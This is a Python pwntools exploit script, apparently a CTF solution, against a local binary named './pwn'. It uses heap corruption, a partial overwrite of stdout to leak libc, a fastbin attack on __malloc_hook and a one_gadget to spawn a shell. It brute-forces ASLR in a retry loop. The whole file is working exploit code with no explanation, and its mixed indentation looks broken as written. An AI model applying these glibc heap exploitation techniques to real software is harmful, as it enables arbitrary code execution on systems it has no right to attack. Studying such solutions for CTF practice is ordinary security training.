from pwn import *

context.terminal = ['tmux','splitw','-v']
context.log_level = 'info'

io = process('./pwn')
elf = ELF('./pwn',checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
one = [0x45226,0x4527a,0xf0364,0xf1207]

def add(size,tag,ch=1):
    io.sendlineafter('>> ','1')
    if ch == 1:
        io.sendlineafter('question\n\n','81')
        io.sendlineafter('?\n',str(size))
        io.sendlineafter('?\n',tag)
    else:
        io.sendlineafter('question\n','81')
        io.sendlineafter('?',str(size))
        io.sendlineafter('?',tag)



def dele(idx,ch=1):
    io.sendlineafter('>> ','2')
    if ch == 1:
        io.sendlineafter('index ?\n',str(idx))
    else:
        io.sendlineafter('index ?',str(idx))

def edit(idx,con,ch=1):
    io.sendlineafter('>> ','4')
    if ch==1:
        io.sendlineafter('index ?\n',str(idx))
        io.sendafter('content ?\n',con)
    else:
        io.sendlineafter('index ?',str(idx))
        io.sendafter('content ?',con)

def pwn():
	add(0x10,'0')
	add(0x20,'1')
	add(0x58,'2')
	add(0x68,'3')
	add(0x10,'4')
	edit(1,p64(0)*3+p64(0x21)) #fake offset 0x50
	dele(0)
	dele(4)
	edit(4,'\x40')
	#gdb.attach(io)
	add(0x10,'5')

	#get fake chunk
	add(0x10,'6')
	edit(6,p64(0)+p64(0xd1))

	dele(2)
	dele(3)
	add(0x58,'7')
	edit(3,'\xdd\x55')
        #gdb.attach(io)
	add(0x68,'8')

        #get stdout
	add(0x68,'9')
        edit(9,51*'A'+p64(0xfbad1800)+p64(0)*3+'\x48')
        libc_base = u64(io.recvuntil('\x7f').ljust(8,'\x00'))-3954339
        log.success('libc: '+hex(libc_base))
        malloc_hook = libc_base + libc.sym['__malloc_hook']
        dele(8,2)
        edit(8,p64(malloc_hook-0x23),2)
        add(0x68,'10',2)
        add(0x68,'11',2)
        edit(11,0x13*'\x00'+p64(one[3]+libc_base),2)
        io.sendlineafter('>> ','1')
        io.sendlineafter('question\n','81')
        io.sendlineafter('?','10')

#pwn()
while True:
    try:
        pwn()
    except:
        io.close()
        io = process('./pwn')
        continue
    else:
        break

io.interactive()
